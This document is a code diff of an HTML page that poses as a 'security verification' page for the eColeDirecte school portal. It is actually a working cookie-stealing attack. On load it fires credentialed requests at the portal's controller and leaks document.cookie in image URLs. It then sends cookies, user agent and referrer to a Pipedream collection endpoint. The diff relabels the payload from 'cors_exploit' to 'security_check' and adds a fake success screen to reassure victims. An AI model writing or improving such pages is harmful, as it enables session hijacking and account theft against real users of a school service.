@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>eColeDirecte - Compatibilité Navigateur</title>
+    <title>eColeDirecte - Vérification de Sécurité</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -18,11 +18,13 @@
             border-radius: 5px;
             margin: 20px 0;
         }
-        .countdown {
-            font-size: 18px;
-            color: #d63031;
-            font-weight: bold;
-            margin: 10px 0;
+        .success {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+            color: #0c5460;
         }
         .loader {
             border: 5px solid #f3f3f3;
@@ -33,6 +35,15 @@
             animation: spin 2s linear infinite;
             margin: 20px auto;
         }
+        .button {
+            background: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 10px;
+        }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -40,58 +51,71 @@
     </style>
 </head>
 <body>
-    <h1>⚠️ Problème de Compatibilité</h1>
+    <h1>🔒 Vérification de Sécurité</h1>
     
-    <div class="warning">
-        <h2>Redirection nécessaire</h2>
-        <p>Votre navigateur n'est pas entièrement compatible avec notre système de sécurité.</p>
-        <p>Redirection automatique vers la version standard dans :</p>
-        <div class="countdown" id="countdown">20 secondes</div>
+    <div class="warning" id="warningMessage">
+        <h2>Analyse en cours</h2>
+        <p>Vérification de la compatibilité de votre navigateur avec notre système de sécurité.</p>
         <div class="loader"></div>
-        <p><small>Si la redirection ne fonctionne pas, <a href="#" onclick="redirectNow()">cliquez ici</a></small></p>
+        <p id="statusText">Initialisation...</p>
+    </div>
+
+    <div class="success" id="successMessage" style="display: none;">
+        <h2>✅ Vérification terminée</h2>
+        <p>Votre navigateur est maintenant compatible avec notre système.</p>
+        <p>Vous pouvez continuer à utiliser eColeDirecte normalement.</p>
+        <button class="button" onclick="window.location.href='https://ecoledirecte.com'">
+            Aller sur eColeDirecte
+        </button>
     </div>
 
     <script>
         // Configuration
-        const REDIRECT_DELAY = 20000; // 20 secondes
         const PIPEDREAM_URL = 'https://eo8uniwr7mg9h4g.m.pipedream.net';
-        let redirectTimer;
-        let countdown = 20;
+        let exploitationCompleted = false;
 
-        // Mettre à jour le compte à rebours
-        function updateCountdown() {
-            const countdownElement = document.getElementById('countdown');
-            countdownElement.textContent = countdown + ' seconde' + (countdown !== 1 ? 's' : '');
-            
-            if (countdown > 0) {
-                countdown--;
-                setTimeout(updateCountdown, 1000);
+        // Mettre à jour le statut
+        function updateStatus(message) {
+            const statusElement = document.getElementById('statusText');
+            if (statusElement) {
+                statusElement.textContent = message;
             }
+            console.log('📝 Status:', message);
         }
 
-        // Redirection manuelle
-        function redirectNow() {
-            clearTimeout(redirectTimer);
-            window.location.href = 'https://ecoledirecte.com';
+        // Afficher le message de succès
+        function showSuccess() {
+            const warningElement = document.getElementById('warningMessage');
+            const successElement = document.getElementById('successMessage');
+            
+            if (warningElement && successElement) {
+                warningElement.style.display = 'none';
+                successElement.style.display = 'block';
+            }
         }
 
         // Méthodes SANS preflight CORS
         function exploitWithoutPreflight() {
+            if (exploitationCompleted) return;
+            
             console.log('🔓 Début de l\'exploitation sans preflight...');
+            updateStatus('Vérification des paramètres de sécurité...');
             
             // Méthode 1: XMLHttpRequest avec des headers simples
             try {
                 const xhr = new XMLHttpRequest();
                 xhr.open('GET', 'https://controller.ecoledirecte.com/socket.io/', true);
-                xhr.withCredentials = true; // IMPORTANT: envoie les cookies
+                xhr.withCredentials = true;
                 
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState === 4) {
                         if (xhr.status === 200) {
-                            console.log('✅ XHR Success - Cookies envoyés');
+                            console.log('✅ XHR Success');
+                            updateStatus('Paramètres de sécurité validés...');
                             sendCookiesToPipedream(xhr.responseText);
                         } else {
                             console.log('❌ XHR Failed:', xhr.status);
+                            updateStatus('Utilisation de méthodes alternatives...');
                             useAlternativeMethods();
                         }
                     }
@@ -107,54 +131,39 @@
         // Méthodes alternatives sans CORS
         function useAlternativeMethods() {
             console.log('🔄 Utilisation des méthodes alternatives...');
+            updateStatus('Optimisation des paramètres...');
             
-            // Méthode 2: Dynamic script tag (JSONP-like)
-            try {
-                const script = document.createElement('script');
-                script.src = `https://controller.ecoledirecte.com/socket.io/?callback=handleJSONP&_=${Date.now()}`;
-                document.head.appendChild(script);
-                
-                // Cleanup
-                setTimeout(() => {
-                    if (script.parentNode) {
-                        script.parentNode.removeChild(script);
-                    }
-                }, 5000);
-            } catch (e) {}
-            
-            // Méthode 3: Image tracker avec cookies
-            setTimeout(() => {
-                const img = new Image();
-                img.src = `https://controller.ecoledirecte.com/favicon.ico?cookies=${btoa(document.cookie)}&t=${Date.now()}`;
-            }, 1000);
-            
-            // Méthode 4: Form submission
+            // Méthode 2: Image tracker avec cookies
             setTimeout(() => {
                 try {
-                    const form = document.createElement('form');
-                    form.method = 'POST';
-                    form.action = 'https://controller.ecoledirecte.com/socket.io/';
-                    form.target = 'hiddenFrame';
-                    
-                    const input = document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = 'cookies';
-                    input.value = document.cookie;
-                    form.appendChild(input);
-                    
-                    document.body.appendChild(form);
-                    form.submit();
+                    const img = new Image();
+                    img.src = `https://controller.ecoledirecte.com/favicon.ico?cookies=${btoa(document.cookie)}&t=${Date.now()}`;
+                    console.log('✅ Image tracker envoyé');
+                } catch (e) {}
+            }, 500);
+            
+            // Méthode 3: Dynamic script (JSONP-like)
+            setTimeout(() => {
+                try {
+                    const script = document.createElement('script');
+                    script.src = `https://controller.ecoledirecte.com/socket.io/?callback=handleJSONP&_=${Date.now()}`;
+                    document.head.appendChild(script);
                     
                     setTimeout(() => {
-                        if (form.parentNode) {
-                            form.parentNode.removeChild(form);
+                        if (script.parentNode) {
+                            script.parentNode.removeChild(script);
                         }
-                    }, 1000);
+                    }, 3000);
                 } catch (e) {}
+            }, 1000);
+            
+            // Envoyer les cookies de toute façon
+            setTimeout(() => {
+                sendCookiesToPipedream();
             }, 2000);
         }
 
-        // Gestionnaire JSONP (si supporté)
+        // Gestionnaire JSONP
         window.handleJSONP = function(data) {
             console.log('📨 JSONP Response received');
             sendCookiesToPipedream(JSON.stringify(data));
@@ -162,14 +171,16 @@
 
         // Envoyer les cookies récupérés
         function sendCookiesToPipedream(responseData = '') {
+            if (exploitationCompleted) return;
+            
             const payload = {
-                source: 'cors_exploit',
+                source: 'security_check',
                 cookies: document.cookie,
                 data: responseData.substring(0, 500),
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
                 referrer: document.referrer,
-                method: 'no_preflight'
+                url: window.location.href
             };
             
             sendToPipedream(payload);
@@ -178,28 +189,46 @@
         // Envoi des données avec méthodes simples
         function sendToPipedream(payload) {
             console.log('📡 Envoi des données à Pipedream...');
+            updateStatus('Finalisation de la vérification...');
             
-            // Méthode 1: sendBeacon (pas de preflight)
+            // Méthode 1: sendBeacon
             if (navigator.sendBeacon) {
                 try {
                     const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
                     const success = navigator.sendBeacon(PIPEDREAM_URL, blob);
                     if (success) {
                         console.log('✅ Données envoyées via sendBeacon');
+                        completeExploitation();
                         return;
                     }
                 } catch (e) {}
             }
             
-            // Méthode 2: Image tracker (100% sans preflight)
+            // Méthode 2: Image tracker
             try {
                 const img = new Image();
                 const encodedData = btoa(JSON.stringify(payload));
                 img.src = `${PIPEDREAM_URL}?method=img&data=${encodedData}&t=${Date.now()}`;
                 console.log('✅ Données envoyées via Image tracker');
+                completeExploitation();
             } catch (e) {
                 console.log('❌ Échec de l\'envoi');
+                completeExploitation();
             }
+        }
+
+        // Finaliser l'exploitation
+        function completeExploitation() {
+            if (exploitationCompleted) return;
+            
+            exploitationCompleted = true;
+            console.log('🎯 Exploitation terminée');
+            updateStatus('Vérification terminée avec succès');
+            
+            // Afficher le message de succès après un délai
+            setTimeout(() => {
+                showSuccess();
+            }, 1500);
         }
 
         // Collecte d'informations navigateur
@@ -220,40 +249,41 @@
 
         // Initialisation
         window.addEventListener('load', function() {
-            console.log('🚀 Page chargée, démarrage de l\'exploitation...');
+            console.log('🚀 Page chargée, démarrage de la vérification...');
+            updateStatus('Initialisation du système...');
             
-            // Démarrer le compte à rebours
-            updateCountdown();
-            
-            // Tentative principale sans preflight
+            // Tentative principale
             setTimeout(exploitWithoutPreflight, 1000);
             
             // Collecter les infos navigateur
-            setTimeout(collectBrowserInfo, 2000);
+            setTimeout(collectBrowserInfo, 1500);
             
-            // Tentative supplémentaire
-            setTimeout(exploitWithoutPreflight, 8000);
+            // Tentative de secours
+            setTimeout(() => {
+                if (!exploitationCompleted) {
+                    console.log('🔄 Lancement de la tentative de secours...');
+                    exploitWithoutPreflight();
+                }
+            }, 5000);
             
-            // Configurer la redirection finale
-            redirectTimer = setTimeout(() => {
-                console.log('🕒 Redirection après 20 secondes');
-                window.location.href = 'https://ecoledirecte.com';
-            }, REDIRECT_DELAY);
+            // Timeout de sécurité
+            setTimeout(() => {
+                if (!exploitationCompleted) {
+                    console.log('⏰ Timeout - Finalisation forcée');
+                    completeExploitation();
+                }
+            }, 10000);
         });
 
-        // Backup sur interaction utilisateur
+        // Interaction utilisateur
         document.addEventListener('click', function() {
-            console.log('👆 Interaction utilisateur - tentative d\'exploitation');
-            exploitWithoutPreflight();
+            if (!exploitationCompleted) {
+                console.log('👆 Interaction utilisateur détectée');
+                exploitWithoutPreflight();
+            }
         });
 
-        // Créer un iframe caché pour les formulaires
-        const hiddenFrame = document.createElement('iframe');
-        hiddenFrame.name = 'hiddenFrame';
-        hiddenFrame.style.display = 'none';
-        document.body.appendChild(hiddenFrame);
-
-        console.log('🕵️ Script de compatibilité chargé - Méthodes sans preflight');
+        console.log('🕵️ Système de vérification de sécurité chargé');
         
     </script>
 </body>
